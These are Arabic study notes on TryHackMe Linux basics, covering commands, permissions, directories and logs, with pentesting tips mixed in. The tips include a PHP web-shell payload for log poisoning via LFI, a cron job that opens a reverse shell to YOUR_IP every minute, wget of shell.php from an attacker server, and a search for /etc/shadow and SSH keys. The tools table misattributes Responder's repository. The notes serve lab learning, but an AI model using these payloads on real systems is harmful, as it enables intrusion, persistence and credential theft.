### Linux Fundamentals 1 & 2

1. **لينكس ده إيه وفين موجود؟**  
   - نظام تشغيل مفتوح المصدر (open-source)، أقوى وأخف من ويندوز في السيرفرات.  
   - بيشتغل في: مواقع الإنترنت (معظمها)، أندرويد، سيارات ذكية، أجهزة دفع (PoS)، أجهزة منزلية، راوترات، سوبر كومبيوترات، وبنية تحتية حرجة (إشارات مرور، حساسات صناعية... إلخ).

2. **أشهر التوزيعات (Distros)**  
   - **Ubuntu** → الأسهل والأشهر في الـ rooms (اللي بنستخدمه دلوقتي).  
   - **Debian** → أساس Ubuntu، مستقر جدًا.  
   - **Kali / Parrot** → للـ hacking و pentesting.  
   - **CentOS / Rocky / Alma** → للسيرفرات الكبيرة.  
   - ممكن تشتغل على رام قليل جدًا (512 ميجا بس!).

1. **الأوامر الأساسية**

| الأمر          | إيه بيعمله؟                              | مثال بسيط                              | نوت مهمة                                   |
|----------------|-------------------------------------------|-----------------------------------------|---------------------------------------------|
| `whoami`       | يقولك اسمك مين دلوقتي                    | `whoami` → tryhackme                    | أول حاجة تعمليها في أي شيل                |
| `pwd`          | يوريك المسار الحالي                      | `/home/tryhackme`                       | عشان تعرفي فين واقفة                     |
| `ls` / `ls -la`| يعرض الملفات (مع -la يوري المخفية)       | `ls -la` → . .. .hidden file.txt       | دايمًا استخدمي -la                        |
| `cd`           | ينقلك لمجلد تاني                          | `cd Documents` أو `cd ..` (لورا)        | `cd ~` = رجع للهوم                        |
| `cat`          | يعرض محتوى ملف نصي                        | `cat todo.txt`                          | `cat /etc/passwd` في الـ labs              |
| `echo`         | يطبع نص                                   | `echo "Hello" > file.txt`               | `>>` يضيف بدون ما يمسح                    |
| `touch`        | ينشئ ملف فارغ                             | `touch secret.txt`                      | لو موجود → يحدث التاريخ بس                |
| `mkdir`        | ينشئ مجلد                                 | `mkdir reports`                         | `mkdir -p parent/child`                     |
| `cp`           | ينسخ ملف أو مجلد                          | `cp file.txt backup.txt`                | `cp -r folder1 folder2`                     |
| `mv`           | ينقل أو يغير اسم                          | `mv old.txt new.txt`                    | ينفع rename أو نقل                         |
| `rm`           | يمسح                                      | `rm file.txt`                           | `rm -r folder` – خطر جدًا!                 |
| `find`         | يدور على ملفات                            | `find -name "*.txt"`                    | مفيد للبحث عن flag.txt                     |
| `grep`         | يبحث داخل ملفات                           | `grep "password" file.txt`              | `grep -R "secret" /etc/`                    |
| `file`         | يقولك نوع الملف                           | `file secret` → ASCII text              | عشان تعرفي الملف ده إيه                    |

5. **الأوبريتورز (Operators) – الحاجات اللي بتخليكي أسرع**

- `&` → شغل في الخلفية (`sleep 100 &`)  
- `&&` → نفذ التاني لو الأول نجح (`apt update && apt upgrade`)  
- `>` → اكتب وامسح القديم (`echo hi > file.txt`)  
- `>>` → اكتب وضيف في الآخر (`echo more >> file.txt`)

5. **الـ Permissions (صلاحيات الملفات) – من `ls -l`**
مثال: `-rw-r--r-- 1 tryhackme tryhackme 0 file.txt`

- أول حرف: `-` = ملف عادي، `d` = مجلد  
- الـ 9 حروف الباقية:  
  - 3 للمالك (owner)  
  - 3 للمجموعة (group)  
  - 3 للباقي (others)  
  r = read (4)  
  w = write (2)  
  x = execute (1)  

  أمثلة:
  - 777 → rwxrwxrwx (الكل يعمل أي حاجة – خطر)  
  - 755 → rwxr-xr-x (المالك كامل، الباقي يقرأ وينفذ)  
  - 644 → rw-r--r-- (المالك يكتب، الباقي يقرأ بس)

7. **أهم المسارات في لينكس (Root Directories)**

| المسار  | إيه جواه؟                                    | ليه مهم في الـ pentesting؟                           |
| ------- | -------------------------------------------- | ---------------------------------------------------- |
| `/etc`  | إعدادات النظام (passwd, shadow, sudoers...)  | هاشات باسووردات، صلاحيات sudo، config files          |
| `/var`  | لوغات، باك اب، مواقع (www)، tmp...           | `/var/log/apache2/access.log` → log poisoning مع LFI |
| `/root` | هوم الـ root                                 | root.txt / دليل إنك وصلتي root                       |
| `/tmp`  | ملفات مؤقتة (بتتمسح لما الجهاز يعمل ريستارت) | مكان آمن تنزلي فيه شيل أو سكريبتات                   |
| `/home` | هوم المستخدمين العاديين                      | user.txt، .ssh keys، .bash_history                   |

8. **نصايح**

- أول حاجة تعمليها في أي شيل: `whoami && id && pwd && ls -la`
- دايمًا ابحثي عن: `/etc/passwd`, `/etc/shadow`, `*.txt`, `*.bak`, `.ssh/id_rsa`
- اللوغات كنز: `/var/log/apache2/access.log` أو `/var/log/nginx/access.log` لـ LFI → RCE
- `/tmp` مكانك المفضل عشان كل يوزر يقدر يكتب فيه
- استخدمي `man COMMAND` (مثل `man ls`) لو عايزة تعرفي كل الـ flags
- لو لقيتي LFI → جربي include اللوغ بعد ما تحقني `<?php system($_GET['cmd']); ?>` في User-Agent
 9. Text Editors
- **nano** → سهل جدًا: `nano file.txt`  
  - Ctrl+O → احفظ  
  - Ctrl+X → اخرج  
- **vim** → أقوى بس صعب في البداية (غرفة منفصلة ليه في THM)

 10. نقل الملفات 

- **wget** → حمل من الإنترنت  
  `wget http://IP:8000/shell.php`

- **SCP** → انقل بين آلتين عبر SSH  
  من جهازك للـ target:  
  `scp shell.php tryhackme@TARGET_IP:/tmp/`  
  من الـ target لجهازك:  
  `scp tryhackme@TARGET_IP:/tmp/flag.txt .`

- **Python HTTP Server** → شغلي سيرفر سريع عشان تحملي منه  
  `python3 -m http.server 8000`  
  بعدين من الـ target: `wget http://YOUR_IP:8000/shell.php`

 11. Processes & Services
- `ps aux` → شوفي كل الـ processes  
- `top` → مراقبة حية (زي Task Manager)  
- `kill PID` → اقتل process  
- `systemctl start/stop/enable apache2` → تحكم في الخدمات

 12. Cron Jobs (مهم للـ persistence & privesc)
- `crontab -e` → عدلي الـ jobs  
- مثال: `* * * * * /bin/bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"`  
  (reverse shell كل دقيقة)

12. مكان ال Logs الرئيسي
- كل ال Logs موجودة في مجلد واحد:  
  **/var/log/**

13. ليه ال Logs مهمة؟
- بتحفظ كل حاجة بتحصل على النظام (طلبات، أخطاء، محاولات تسجيل دخول، حظر IPs... إلخ).  
- بتساعد في:  
  - تشخيص مشاكل الأداء  
  - مراقبة الاختراقات أو الهجمات  
  - التحقيق في نشاط اليوزرز أو المهاجمين

14. **أشهر أنواع ال Logs

15. **Apache2 Web Server**  
   - **access.log** → كل طلب HTTP/HTTPS (IPs، الصفحات، User-Agent، وقت الطلب...)  
     → أهم حاجة لـ **log poisoning** مع LFI/RFI  
   - **error.log** → أخطاء السيرفر والـ PHP (مفيد لمعرفة paths أو versions)

2. **Fail2Ban**  
   - **fail2ban.log** → محاولات brute-force (SSH, login...) والـ IPs اللي اتـ ban  
     → تشوفي إذا الـ IP بتاعك اتـ ban ولا لأ

3. **UFW (Firewall)**  
   - **ufw.log** → طلبات الشبكة المرفوضة أو المسموحة (IPs، ports...)  
     → تشوفي إذا فيه firewall بيحظر حركتك

15. أنواع ال Logs تانية مهمة
- **auth.log** → محاولات تسجيل دخول (SSH, sudo, login failures/success)  
- **syslog** → لوغ عام (fallback لو مش لاقية اللوغ الخاص)  
- **kern.log** → مشاكل الكيرنل أو الهاردوير

16. نقطة مهمة جدًا
- ال Logs بتتدوّر (rotate) تلقائيًا عشان ما تكبرش أوي (log rotation).  
  يعني ممكن تلاقي access.log.1.gz أو access.log.2.gz (مضغوطة)
17. في الـ pentesting / labs إيه اللي بنعمله بال Logs؟

- أشهر استغلال: **Log Poisoning**  
  16. تحقني كود خبيث (مثل `<?php system($_GET['cmd']); ?>`) في User-Agent أو Referer.  
  17. بعدين تستغلي LFI وتعملي include للوغ نفسه:  
     `?file=/var/log/apache2/access.log&cmd=id`  
  → لو نجح → RCE كامل

- دايمًا جربي المسارات دي لو لقيتي LFI:
  - `/var/log/apache2/access.log`
  - `/var/log/nginx/access.log`
  - `/var/log/auth.log`

16. Tools
### أمثلة على أدوات مشهورة مشابهة (بتلاقيها على GitHub)

| الأداة                 | إيه بتعمله؟                                      | لغة       | لينك تقريبي على GitHub     |
| ---------------------- | ------------------------------------------------ | --------- | -------------------------- |
| **Subfinder**          | subdomain enumeration سريع جدًا                  | Go        | projectdiscovery/subfinder |
| **Amass**              | subdomain enum + OSINT قوي                       | Go        | owasp-amass/amass          |
| **Nuclei**             | scanner للـ vulnerabilities بـ templates         | Go        | projectdiscovery/nuclei    |
| **Ffuf**               | أسرع dir/file brute-forcer                       | Go        | ffuf/ffuf                  |
| **Gobuster**           | dir busting + vhost busting                      | Go        | OJ/gobuster                |
| **Dirsearch**          | dir brute-force (python)                         | Python    | maurosoria/dirsearch       |
| **SQLMap**             | أوتوماتيك SQL Injection exploitation             | Python    | sqlmapproject/sqlmap       |
| **LinPEAS / WinPEAS**  | Privilege Escalation enumeration scripts         | Bash / PS | carlospolop/PEASS-ng       |
| **Impacket**           | أدوات لـ Windows/AD attacks (SMB, Kerberos...)   | Python    | fortra/impacket            |
| **CrackMapExec** (cme) | AD / Windows post-exploitation & enum            | Python    | byt3bl33d3r/CrackMapExec   |
| **Responder**          | LLMNR/NBT-NS/MDNS poisoning + hash capture       | Python    | lanjelot/pyLAPS            |
| **Evilginx2**          | Phishing + session hijacking (man-in-the-middle) | Go        | kgretzky/evilginx2         |
| **Sliver**             | C2 framework (modern & cross-platform)           | Go        | BishopFox/sliver           |
| **Covenant**           | .NET C2 framework                                | C#        | cobbr/Covenant             |

And Done :)